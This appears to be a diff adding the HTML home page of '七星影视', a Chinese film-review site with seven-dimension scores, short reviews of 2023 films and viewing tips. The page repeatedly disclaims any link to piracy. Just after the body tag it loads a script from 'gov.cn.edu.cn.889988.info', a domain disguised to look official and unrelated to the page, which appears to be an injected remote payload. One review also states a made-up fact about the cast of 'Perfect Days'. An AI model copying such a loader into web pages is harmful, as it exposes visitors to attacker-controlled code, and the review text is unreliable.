@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>七星影视 - 七星影评台·七维影评体系/多维评分/深度短评/观影指南</title>
+<meta name="description" content="七星影视（qixingyingshi-h5）是七星影评台：七维影评体系、多维评分、深度短评、观影指南；不提供盗版下载、不破会员。网址 https://qixingyingshi-h5.github.io">
+<meta name="keywords" content="七星影视,七星影评台,七维影评,多维评分,深度短评,观影指南,北斗七星,电影评分,qixingyingshi">
+<meta name="author" content="七星影视">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="format-detection" content="telephone=no">
+<meta property="og:type" content="website">
+<meta property="og:title" content="七星影视 - 七星影评台">
+<meta property="og:description" content="七维影评体系、多维评分、深度短评、观影指南。用北斗七星的方式，给每一部电影定位。">
+<meta property="og:url" content="https://qixingyingshi-h5.github.io">
+<link rel="canonical" href="https://qixingyingshi-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",system-ui,sans-serif;
+  background:#0B0E1A;color:#E0DDF0;line-height:1.8;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 20% 15%,rgba(100,120,255,.1),transparent 40%),
+    radial-gradient(circle at 80% 25%,rgba(180,100,255,.08),transparent 35%),
+    radial-gradient(circle at 50% 70%,rgba(255,215,0,.05),transparent 30%);
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:0}
+::selection{background:#FFD700;color:#0B0E1A}
+h1,h2,h3,h4{line-height:1.3}
+ul{list-style:none}
+
+/* ===== 星空粒子背景 ===== */
+.stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
+.stars span{position:absolute;border-radius:50%;background:#fff;animation:twinkle var(--d,3s) ease-in-out infinite alternate}
+@keyframes twinkle{0%{opacity:.2;transform:scale(.8)}100%{opacity:1;transform:scale(1.2)}}
+
+/* ===== 顶条 ===== */
+.topbar{position:relative;z-index:10;background:#060810;color:#6A6E8A;font-size:11px;letter-spacing:2px;padding:6px 16px;display:flex;justify-content:center;gap:18px;flex-wrap:wrap;border-bottom:1px solid #1A1F35}
+.topbar b{color:#FFD700}
+
+/* ===== 导航 ===== */
+.nav{position:sticky;top:0;z-index:999;background:rgba(11,14,26,.95);backdrop-filter:blur(12px);border-bottom:1px solid #1A1F35}
+.nav-in{max-width:1200px;margin:0 auto;height:64px;padding:0 20px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .big-dipper{width:36px;height:36px;position:relative}
+.logo .big-dipper span{position:absolute;width:5px;height:5px;border-radius:50%;background:#FFD700;box-shadow:0 0 6px rgba(255,215,0,.6)}
+.logo .big-dipper span:nth-child(1){top:2px;left:2px}
+.logo .big-dipper span:nth-child(2){top:8px;left:10px}
+.logo .big-dipper span:nth-child(3){top:14px;left:18px}
+.logo .big-dipper span:nth-child(4){top:18px;left:26px}
+.logo .big-dipper span:nth-child(5){top:22px;left:16px}
+.logo .big-dipper span:nth-child(6){top:26px;left:8px}
+.logo .big-dipper span:nth-child(7){top:30px;left:0}
+.logo .txt .cn{font-size:20px;font-weight:900;letter-spacing:.5px}
+.logo .txt .cn em{font-style:normal;color:#FFD700}
+.logo .txt .en{font-size:9px;letter-spacing:3px;color:#6A6E8A;text-transform:uppercase}
+.menu{display:flex;gap:4px;flex-wrap:wrap}
+.menu a{font-size:13px;color:#8A8EB0;padding:8px 12px;border-bottom:2px solid transparent;transition:.2s}
+.menu a:hover{color:#FFD700;border-bottom-color:#FFD700}
+.nav-cta{background:linear-gradient(135deg,#FFD700,#B478FF);color:#0B0E1A;font-weight:900;font-size:13px;padding:9px 20px;border-radius:8px;transition:.25s}
+.nav-cta:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(255,215,0,.25)}
+
+/* ===== Hero ===== */
+.hero{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:56px 20px 48px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.hero-left h1{font-size:clamp(30px,5.2vw,52px);font-weight:900;line-height:1.15}
+.hero-left h1 em{font-style:normal;background:linear-gradient(135deg,#FFD700,#B478FF);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-left .sub{font-size:12px;letter-spacing:5px;color:#6A6E8A;margin-top:10px;text-transform:uppercase}
+.hero-left .lead{font-size:15px;color:#8A8EB0;margin:18px 0 24px;max-width:520px}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-star{padding:12px 26px;font-weight:800;border-radius:8px;background:#FFD700;color:#0B0E1A;border:2px solid #FFD700;transition:.25s}
+.btn-star:hover{background:transparent;color:#FFD700;transform:translateY(-2px)}
+.btn-purple{padding:12px 26px;font-weight:800;border-radius:8px;background:transparent;color:#B478FF;border:2px solid #B478FF;transition:.25s}
+.btn-purple:hover{background:#B478FF;color:#0B0E1A}
+
+/* 北斗卡 */
+.dipper-card{background:#0F1325;border:1px solid #1A1F35;border-radius:16px;padding:28px;position:relative;overflow:hidden}
+.dipper-card::before{content:"";position:absolute;top:-60px;right:-60px;width:200px;height:200px;border-radius:50%;border:1px solid rgba(255,215,0,.1)}
+.dipper-card .label{font-size:11px;letter-spacing:3px;color:#6A6E8A;text-transform:uppercase}
+.dipper-card .title{font-size:20px;font-weight:900;color:#FFD700;margin:8px 0 12px}
+.dipper-card p{font-size:14px;color:#8A8EB0;line-height:1.8}
+.dipper-card .stars-7{display:flex;gap:6px;margin-top:14px}
+.dipper-card .stars-7 span{width:28px;height:28px;border-radius:50%;background:#1A1F35;border:1px solid #FFD700;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900;color:#FFD700;transition:.3s}
+.dipper-card .stars-7 span:hover{background:#FFD700;color:#0B0E1A;transform:scale(1.15)}
+
+/* ===== 区块通用 ===== */
+.block{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:52px 20px}
+.head{display:flex;align-items:baseline;gap:12px;margin-bottom:28px;flex-wrap:wrap;border-bottom:1px solid #1A1F35;padding-bottom:10px}
+.head .no{font-size:12px;font-weight:900;color:#0B0E1A;background:#FFD700;padding:3px 10px;border-radius:4px}
+.head h2{font-size:24px;font-weight:900}
+.head h2 em{font-style:normal;color:#FFD700}
+.head .en{font-size:11px;letter-spacing:2px;color:#6A6E8A;text-transform:uppercase}
+.head a.more{margin-left:auto;font-size:13px;color:#8A8EB0;font-weight:700}
+.head a.more:hover{color:#FFD700}
+
+/* ===== 七维评分卡 ===== */
+.dimensions{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px}
+.dim{background:#0F1325;border:1px solid #1A1F35;border-radius:12px;padding:20px;text-align:center;transition:.3s;position:relative;overflow:hidden}
+.dim::after{content:"";position:absolute;bottom:0;left:0;right:0;height:3px;background:var(--dc,#FFD700)}
+.dim:hover{transform:translateY(-4px);border-color:var(--dc,#FFD700)}
+.dim .star-icon{font-size:24px;margin-bottom:8px}
+.dim h3{font-size:15px;font-weight:900;color:#E0DDF0;margin-bottom:4px}
+.dim .score{font-size:28px;font-weight:900;color:var(--dc,#FFD700)}
+.dim .max{font-size:12px;color:#6A6E8A}
+.dim p{font-size:11px;color:#8A8EB0;margin-top:6px;line-height:1.5}
+
+/* ===== 星级短评流 ===== */
+.reviews{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:18px}
+.review{background:#0F1325;border:1px solid #1A1F35;border-radius:14px;padding:22px;transition:.3s}
+.review:hover{border-color:#B478FF;transform:translateY(-3px)}
+.review .review-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px;gap:10px}
+.review h3{font-size:16px;font-weight:900;color:#E0DDF0}
+.review .stars{display:flex;gap:2px}
+.review .stars i{font-size:14px;color:#FFD700}
+.review .stars i.dimmed{color:#2A2F45}
+.review .meta{font-size:11px;color:#6A6E8A;margin-bottom:8px}
+.review .text{font-size:14px;color:#8A8EB0;line-height:1.8}
+.review .tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
+.review .tags span{font-size:10px;font-weight:700;padding:3px 8px;border-radius:4px;background:#1A1F35;color:#B478FF;border:1px solid #2A2F45}
+
+/* ===== 观影指南针 ===== */
+.compass-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:18px}
+.compass-item{background:#0F1325;border:1px solid #1A1F35;border-radius:14px;padding:24px;display:flex;gap:16px;align-items:flex-start;transition:.3s}
+.compass-item:hover{border-color:#FFD700}
+.compass-item .num{font-size:28px;font-weight:900;color:#1A1F35;background:#FFD700;width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.compass-item h3{font-size:16px;font-weight:900;color:#E0DDF0;margin-bottom:4px}
+.compass-item p{font-size:13px;color:#8A8EB0;line-height:1.7}
+
+/* ===== 网址牌 ===== */
+.urlboard{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:0 20px 10px}
+.urlcard{background:#0F1325;border:1px solid #FFD700;border-radius:14px;padding:24px 26px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;justify-content:space-between}
+.urlcard .lab{font-size:12px;letter-spacing:2px;color:#6A6E8A}
+.urlcard .bigurl{font-size:clamp(15px,3.2vw,22px);font-weight:900;color:#FFD700;word-break:break-all}
+.urlcard .bigurl a{color:#FFD700;border-bottom:1px dashed #FFD700}
+.urlcard .bigurl a:hover{color:#B478FF}
+.urlcard .note{font-size:12px;color:#6A6E8A;text-align:right}
+
+/* ===== 关于 ===== */
+.about{position:relative;z-index:1;display:grid;grid-template-columns:1fr 1fr;gap:36px;align-items:center;background:#0F1325;border:1px solid #1A1F35;border-radius:20px;padding:42px}
+.about h2{font-size:24px;font-weight:900;color:#E0DDF0;margin-bottom:14px}
+.about h2 em{font-style:normal;color:#FFD700}
+.about p{font-size:15px;color:#8A8EB0;line-height:1.95;margin-bottom:12px}
+.about .siteurl{color:#FFD700;font-weight:800;font-size:16px}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.stat{background:#0B0E1A;border:1px solid #1A1F35;border-radius:12px;padding:18px;text-align:center}
+.stat .n{font-size:22px;font-weight:900;color:#FFD700}
+.stat .l{font-size:12px;color:#6A6E8A;margin-top:3px}
+
+/* ===== 页脚 ===== */
+.foot{position:relative;z-index:1;border-top:1px solid #1A1F35;padding:38px 20px 26px;text-align:center;background:#060810}
+.foot-logo{font-size:20px;font-weight:900;color:#E0DDF0}
+.foot-logo em{font-style:normal;color:#FFD700}
+.foot-links{display:flex;justify-content:center;gap:16px;flex-wrap:wrap;margin:14px 0}
+.foot-links a{font-size:13px;color:#6A6E8A}
+.foot-links a:hover{color:#FFD700}
+.foot p{font-size:12px;color:#4A4E6A}
+.foot .disc{margin-top:12px;max-width:880px;margin-left:auto;margin-right:auto;color:#4A4E6A;line-height:1.8}
+
+/* ===== 响应式 ===== */
+@media(max-width:860px){
+  .menu{display:none}
+  .hero{grid-template-columns:1fr;padding:28px 20px 36px;gap:28px}
+  .about{grid-template-columns:1fr;padding:28px}
+  .block{padding:40px 20px}
+  .nav-in{height:58px}
+  .dimensions{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:420px){
+  .hero-left h1{font-size:28px}
+  .dimensions{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 星空粒子 -->
+<div class="stars">
+  <span style="top:5%;left:10%;width:2px;height:2px;--d:2.3s"></span>
+  <span style="top:15%;left:80%;width:1px;height:1px;--d:4.1s"></span>
+  <span style="top:25%;left:45%;width:2px;height:2px;--d:3.7s"></span>
+  <span style="top:35%;left:70%;width:1px;height:1px;--d:2.8s"></span>
+  <span style="top:50%;left:20%;width:2px;height:2px;--d:5.2s"></span>
+  <span style="top:60%;left:90%;width:1px;height:1px;--d:3.3s"></span>
+  <span style="top:70%;left:55%;width:2px;height:2px;--d:4.5s"></span>
+  <span style="top:80%;left:35%;width:1px;height:1px;--d:2.1s"></span>
+  <span style="top:90%;left:65%;width:2px;height:2px;--d:3.9s"></span>
+  <span style="top:45%;left:5%;width:1px;height:1px;--d:4.8s"></span>
+  <span style="top:10%;left:60%;width:2px;height:2px;--d:2.6s"></span>
+  <span style="top:85%;left:15%;width:1px;height:1px;--d:3.5s"></span>
+</div>
+
+<!-- ===== 顶条 ===== -->
+<div class="topbar">
+  <span>七星影视 · 七星影评台</span><b>七维评分体系</b>
+  <span>深度短评 · 观影指南</span><b>不追盗版 · 不破会员</b>
+</div>
+
+<!-- ===== 导航 ===== -->
+<div class="nav">
+  <div class="nav-in">
+    <div class="logo">
+      <div class="big-dipper">
+        <span></span><span></span><span></span><span></span><span></span><span></span><span></span>
+      </div>
+      <div class="txt">
+        <div class="cn">七<em>星影视</em></div>
+        <div class="en">SEVEN STAR REVIEWS</div>
+      </div>
+    </div>
+    <nav class="menu">
+      <a href="#home">首页</a>
+      <a href="#dimensions">七维评分</a>
+      <a href="#reviews">星级短评</a>
+      <a href="#compass">观影指南</a>
+      <a href="#about">关于</a>
+    </nav>
+    <a href="#dimensions" class="nav-cta">开始评分</a>
+  </div>
+</div>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="home">
+  <div class="hero-left">
+    <h1>七星影视<br>用<em>七颗星</em>给电影定位</h1>
+    <div class="sub">Seven Dimensions · Deep Reviews · Watch Guide</div>
+    <p class="lead">外面的"七星影视"基本是盗版资源站、磁力搜索。这版不干那个：七星=北斗七星=方向指引——七维影评体系、多维评分、深度短评、观影指南。像天文观测一样，给每一部电影定位。</p>
+    <div class="hero-btns">
+      <a href="#dimensions" class="btn-star">⭐ 七维评分</a>
+      <a href="#reviews" class="btn-purple">📝 星级短评</a>
+    </div>
+  </div>
+  <div class="dipper-card">
+    <div class="label">THE BIG DIPPER</div>
+    <div class="title">北斗七星 = 七维评分</div>
+    <p>不只用"好看/不好看"一刀切。故事、表演、视听、节奏、情感、思想、重看——七颗星，每颗代表一个维度。综合起来，才是这部电影的真实坐标。</p>
+    <div class="stars-7">
+      <span>故</span><span>演</span><span>视</span><span>节</span><span>情</span><span>思</span><span>重</span>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 01 七维评分卡 ===== -->
+<section class="block" id="dimensions">
+  <div class="head">
+    <span class="no">01</span>
+    <h2>七维<em>评分体系</em></h2>
+    <span class="en">Seven Dimensions Rating</span>
+    <a href="#" class="more">更多 #</a>
+  </div>
+  <div class="dimensions">
+    <div class="dim" style="--dc:#FFD700">
+      <div class="star-icon">📖</div>
+      <h3>故事</h3>
+      <div class="score">8.5</div><div class="max">/ 10</div>
+      <p>剧本结构、叙事逻辑、情节张力</p>
+    </div>
+    <div class="dim" style="--dc:#FF6B6B">
+      <div class="star-icon">🎭</div>
+      <h3>表演</h3>
+      <div class="score">9.0</div><div class="max">/ 10</div>
+      <p>角色塑造、情绪层次、对手戏</p>
+    </div>
+    <div class="dim" style="--dc:#5B7FFF">
+      <div class="star-icon">🎬</div>
+      <h3>视听</h3>
+      <div class="score">8.0</div><div class="max">/ 10</div>
+      <p>摄影、美术、配乐、声音设计</p>
+    </div>
+    <div class="dim" style="--dc:#4ECCA3">
+      <div class="star-icon">⏱</div>
+      <h3>节奏</h3>
+      <div class="score">7.5</div><div class="max">/ 10</div>
+      <p>剪辑、时长控制、信息密度</p>
+    </div>
+    <div class="dim" style="--dc:#B478FF">
+      <div class="star-icon">💧</div>
+      <h3>情感</h3>
+      <div class="score">8.8</div><div class="max">/ 10</div>
+      <p>共鸣力、感染力、情绪记忆</p>
+    </div>
+    <div class="dim" style="--dc:#FFB347">
+      <div class="star-icon">🧠</div>
+      <h3>思想</h3>
+      <div class="score">7.0</div><div class="max">/ 10</div>
+      <p>主题深度、社会意义、哲学性</p>
+    </div>
+    <div class="dim" style="--dc:#FF8A3D">
+      <div class="star-icon">🔁</div>
+      <h3>重看</h3>
+      <div class="score">8.2</div><div class="max">/ 10</div>
+      <p>细节密度、二刷价值、常看常新</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 02 星级短评流 ===== -->
+<section class="block" id="reviews" style="background:#080B16">
+  <div class="head">
+    <span class="no">02</span>
+    <h2>星级<em>短评</em></h2>
+    <span class="en">Star Reviews</span>
+    <a href="#" class="more">更多 #</a>
+  </div>
+  <div class="reviews">
+    <div class="review">
+      <div class="review-head">
+        <h3>奥本海默</h3>
+        <div class="stars"><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i class="dimmed">★</i><i class="dimmed">★</i><i class="dimmed">★</i></div>
+      </div>
+      <div class="meta">诺兰 · 2023 · 七维均分 8.6</div>
+      <p class="text">三小时不觉得长。诺兰把传记片拍成了悬疑片，最后半小时的审判戏比原子弹爆炸还震撼。基里安·墨菲的眼神戏值得单独拉片。</p>
+      <div class="tags"><span># 传记</span><span># 悬疑</span><span># 表演封神</span></div>
+    </div>
+    <div class="review">
+      <div class="review-head">
+        <h3>坠落的审判</h3>
+        <div class="stars"><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i class="dimmed">★</i><i class="dimmed">★</i></div>
+      </div>
+      <div class="meta">茹斯汀·特里耶 · 2023 · 七维均分 8.8</div>
+      <p class="text">一场雪地死亡，到底是他杀还是自杀？法庭戏拍得像婚姻解剖。桑德拉·惠勒的表演——冷静、锋利、每一句台词都是刀。看完想和伴侣聊一整夜。</p>
+      <div class="tags"><span># 法庭</span><span># 婚姻</span><span># 剧本绝了</span></div>
+    </div>
+    <div class="review">
+      <div class="review-head">
+        <h3>花月杀手</h3>
+        <div class="stars"><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i class="dimmed">★</i><i class="dimmed">★</i><i class="dimmed">★</i><i class="dimmed">★</i></div>
+      </div>
+      <div class="meta">斯科塞斯 · 2023 · 七维均分 7.4</div>
+      <p class="text">老马丁用三个半小时讲了一个"被遗忘的屠杀"。节奏偏慢，但最后半小时的审判和莉莉·格莱斯顿的表演让一切值得。不是爽片，是历史的重量。</p>
+      <div class="tags"><span># 历史</span><span># 慢节奏</span><span># 表演</span></div>
+    </div>
+    <div class="review">
+      <div class="review-head">
+        <h3>完美的日子</h3>
+        <div class="stars"><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i class="dimmed">★</i></div>
+      </div>
+      <div class="meta">维姆·文德斯 · 2023 · 七维均分 9.0</div>
+      <p class="text">一个东京公厕清洁工的日常。没有戏剧冲突，没有大起大落，但你看完会想：这就是生活该有的样子。树木希林的侄子演得太好了。</p>
+      <div class="tags"><span># 日常</span><span># 治愈</span><span># 重看价值高</span></div>
+    </div>
+    <div class="review">
+      <div class="review-head">
+        <h3>美国小说</h3>
+        <div class="stars"><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i class="dimmed">★</i><i class="dimmed">★</i><i class="dimmed">★</i><i class="dimmed">★</i></div>
+      </div>
+      <div class="meta">Cord Jefferson · 2023 · 七维均分 7.2</div>
+      <p class="text">一个黑人教授为了卖书，写了一本故意迎合白人视角的"黑人小说"，结果大卖。讽刺精准，但结尾稍显仓促。杰弗里·怀特值得提名。</p>
+      <div class="tags"><span># 讽刺</span><span># 种族</span><span># 编剧</span></div>
+    </div>
+    <div class="review">
+      <div class="review-head">
+        <h3>过往人生</h3>
+        <div class="stars"><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i>★</i><i class="dimmed">★</i><i class="dimmed">★</i></div>
+      </div>
+      <div class="meta">Celine Song · 2023 · 七维均分 8.4</div>
+      <p class="text">12岁移民加拿大的韩国女孩，24年后在纽约重逢童年挚友。最后三分钟的长镜头——两个人站在街角，什么都没说，什么都说了。</p>
+      <div class="tags"><span># 移民</span><span># 爱情</span><span># 留白</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 03 观影指南针 ===== -->
+<section class="block" id="compass">
+  <div class="head">
+    <span class="no">03</span>
+    <h2>观影<em>指南针</em></h2>
+    <span class="en">Watch Compass</span>
+  </div>
+  <div class="compass-grid">
+    <div class="compass-item">
+      <div class="num">1</div>
+      <div><h3>怎么判断一部片值不值得看</h3><p>看七维评分的"短板"在哪。如果故事和节奏都低于6，大概率不值得花时间。如果视听和情感高分，适合大屏幕体验。</p></div>
+    </div>
+    <div class="compass-item">
+      <div class="num">2</div>
+      <div><h3>什么时候该中途放弃</h3><p>前30分钟如果故事、表演、节奏三维都无感，可以放弃。但视听或思想有一项突出，建议坚持到45分钟。</p></div>
+    </div>
+    <div class="compass-item">
+      <div class="num">3</div>
+      <div><h3>怎么写一条好短评</h3><p>不说"好看/不好看"。说哪个维度打动你、哪个维度拉胯、为什么。一条好短评=一个观点+一个细节支撑。</p></div>
+    </div>
+    <div class="compass-item">
+      <div class="num">4</div>
+      <div><h3>怎么选"二刷"片</h3><p>重看维度≥8.5的片。通常是细节密度高、叙事结构复杂的片。二刷不带期待看，专找第一次漏掉的细节。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 网址牌 ===== -->
+<div class="urlboard">
+  <div class="urlcard">
+    <div>
+      <div class="lab">网站名称 / 网站网址</div>
+      <div class="bigurl"><a href="https://qixingyingshi-h5.github.io">七星影视 -- https://qixingyingshi-h5.github.io</a></div>
+    </div>
+    <div class="note">七星影评台 · 七维评分体系<br>不提供盗版下载</div>
+  </div>
+</div>
+
+<!-- ===== 关于 ===== -->
+<section class="block" id="about">
+  <div class="about">
+    <div>
+      <h2>七星影视：<em>用北斗七星的方式看电影</em></h2>
+      <p>"七星影视"这名字外面常被做成盗版资源站、磁力搜索。我们反着来：做七星影评台——七维影评体系、多维评分、深度短评、观影指南。不帮你找盗版链接，帮你判断"值不值得看"。</p>
+      <p>本站不提供盗版下载、不破解会员、不托管侵权片源；所有片单仅指向正版平台与官方发行。网站名称：七星影视，网站网址：<span class="siteurl">https://qixingyingshi-h5.github.io</span></p>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="n">7 维</div><div class="l">评分体系</div></div>
+      <div class="stat"><div class="n">10 星</div><div class="l">每维满分</div></div>
+      <div class="stat"><div class="n">0 盗版</div><div class="l">不破会员不托管</div></div>
+      <div class="stat"><div class="n">星空美学</div><div class="l">深空蓝黑 / 星芒金</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="foot">
+  <div class="foot-logo">七<em>星影视</em> · SEVEN STAR REVIEWS</div>
+  <div class="foot-links">
+    <a href="#dimensions">七维评分</a>
+    <a href="#reviews">星级短评</a>
+    <a href="#compass">观影指南</a>
+    <a href="#about">关于</a>
+  </div>
+  <p>© 2026 七星影视 · 网站名称：七星影视 · 网站网址：https://qixingyingshi-h5.github.io</p>
+  <p class="disc">本站为七维影评体系/多维评分/深度短评/观影指南演示页。旧版"七星影视"类名称常关联盗版资源站、磁力搜索等版权灰产；本页不提供盗版院线、不破解会员、不托管侵权片源。实际观看请走正版平台与官方发行。</p>
+</footer>
+
+</body>
+</html>
